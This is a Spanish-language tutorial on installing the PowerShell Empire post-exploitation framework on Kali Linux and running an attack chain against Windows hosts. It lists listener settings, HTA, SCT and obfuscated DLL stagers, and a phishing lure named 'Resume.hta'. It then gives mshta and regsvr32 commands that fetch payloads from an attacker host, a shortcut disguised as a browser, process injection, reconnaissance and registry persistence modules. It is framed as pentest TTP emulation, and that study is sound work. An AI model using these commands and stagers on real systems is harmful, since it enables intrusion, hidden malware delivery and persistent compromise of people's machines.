# Powershell Empire: Post-Explotación en redes Windows con Kali linux

-Powershell Empire, es un framework de post-explotación basado en el despliegue de agentes que se ejecutan en las máquinas comprometidas y son gestionados desde una consola bajo el control del pentester.
-Consiste en la integración de los frameworks conocidos de pentesting con powershell.
-Se centra únicamente en Python con comunicaciones criptográficamente seguras con el complemento de una arquitectura flexible.

# Componentes de PowerShell Empire

1.Listeners: Es un proceso que escucha una conexión desde la máquina que estamos atacando. Esto ayuda a Empire a enviar el “paquete” a la computadora del atacante.
2.Agentes: Es un programa que mantiene una conexión entre tu computadora y el host comprometido.
3.Stagers: Es un fragmento de código que permite que nuestro código malicioso se ejecute a través del agente en el host comprometido.
4.Módulos: Esto es lo que ejecuta nuestros comandos maliciosos, que pueden recopilar credenciales y escalar nuestros privilegios como se mencionó anteriormente.

## Prerequisitos
1. Considerar los S.O compatibles que han sido testeados para el uso de Empire:
-Kali Linux Rolling (En nuestro caso estaremos utilizando este S.O)
-Ubuntu 20.04
-Debian 10

> Verificar con:
> uname -r

2. Actualizar todas las dependencias y paquetes del S.O
> sudo apt update 

3. Tener instalado Python como mínimo la versión 3.8 (Se recomiendo la v3.8 o v3.9)
> Verificar con:
> python --version

4. Para los S.O Kali instalar la versión utilizando sudo (las nuevas versiones de Kali requieren correr “sudo” antes de empezar Empire.


## Instalación Empire
1. Instalar la ultima versión de Empire corriendo lo siguiente:
> sudo apt install powershell-empire

El resultado debe ser el siguiente:
![image](https://i.imgur.com/DAawQol.jpg)

## Inicializar Empire
1. Inicializar servidor empire
> sudo powershell-empire server

![image](https://i.imgur.com/SuNG6Of.jpg)

2. Inicializar cliente empire
> sudo powershell-empire client

![image](https://i.imgur.com/X2cQsBp.jpg)

## Instalación Starkiller
1. Instalar Starkiller para tener GUI
> cd /opt
> sudo wget https://github.com/BC-SECURITY/Starkiller/releases/download/v1.0.0/starkiller-1.0.0.AppImage
> sudo chmod +x starkiller-1.0.0.AppImage

![image](https://i.imgur.com/rFlVBTU.jpg)

## Inicializar Starkiller (GUI)
1. Iniciar Starkiller
> cd /opt/starkiller
> ./starkiller-1.0.0.AppImage

![image](https://i.imgur.com/UfK06Mk.jpg)

## Creación de componentes PowerShell Empire
1.Crear Listener
> Type: http
> Name: http
> Host: http://10.0.0.187
> Port: 80
> BindIP: 10.0.0.187
> Jitter: 0.5
> StagingKey: empireadmin

![image](https://i.imgur.com/uqNHCBy.jpg)

2.Crear Stagers
-Generar Stager HTA:
Type: windows/hta
> Listner: http
> Base64: True
> Language: powershell
> Outfile: /tmp/Resume.hta
-Generar Stager SCT:
> Type: windows/launcher_sct
> Listner: http
> Base64: True
> Language: powershell
-Generar Stager DLL:
> Type: windows/dll
> Listner: http
> Arch: x86
> Language: powershell
> OutFile: /tmp/launcher.dll
> Obfuscate: True
> ObfuscateCommand: Token\String\1

Resultado de la creación de Stagers:
![image](https://i.imgur.com/htm5bqB.jpg)

3.Descargar Stagers en /tmp y usarlos con SimpleHTTPServer
> cd /tmp
> python -m SimpleHTTPServer 8080

![image](https://i.imgur.com/JurGJ9P.jpg)

##Emulación de TTP's
1. Acceso Inicial
Enviamos un link de descarga o mail http://192.168.126.129/Resume.hta

2. Ejecución
-Ejecutar Resume.hta
> mshta http://10.0.0.187:8080/Resume.hta

![image](https://i.imgur.com/lZCeoZq.jpg)

-Migrar a otro proceso con reflective PE Injection
> ver procesos: ps
> usemodule code_execution/invoke_reflectivepeinjection
> set ProcID: <processID>
> set DllPath: /tmp/launcher.dll

![image](https://i.imgur.com/Ap8ghR1.jpg)
  
3. Agente Activo
![image](https://i.imgur.com/9Q5JA25.jpg)
  
4. Descubrimiento
> whoami
> usemodule situational_awareness/host/antivirusproduct 
> usemodule situational_awareness/host/get_uaclevel 
> usemodule situational_awareness/host/winenum

![image](https://i.imgur.com/8DjskSO.jpg)
5. Persistencia
> usemodule persistence/userland/registry
> set Listener: http

![image](https://i.imgur.com/loz2sRu.jpg)

6. Evasión de defensa
-Ejecución con regsvr32 y scripting. Se crea un acceso directo enmascarango un navegador web con target:
> C:\Windows\System32\cmd.exe /c "C:\Windows\System32\regsvr32.exe /s /n /u /i:http:\192.168.126.129:8080\launcher.sct scrobj.dll"

![image](https://i.imgur.com/maJN0cy.jpg)

#### De lo presentado anteriormente se puede apreciar que el malware (.exe/dll/hta) permite construir cualquier ataque ya que se tiene acceso a win32.
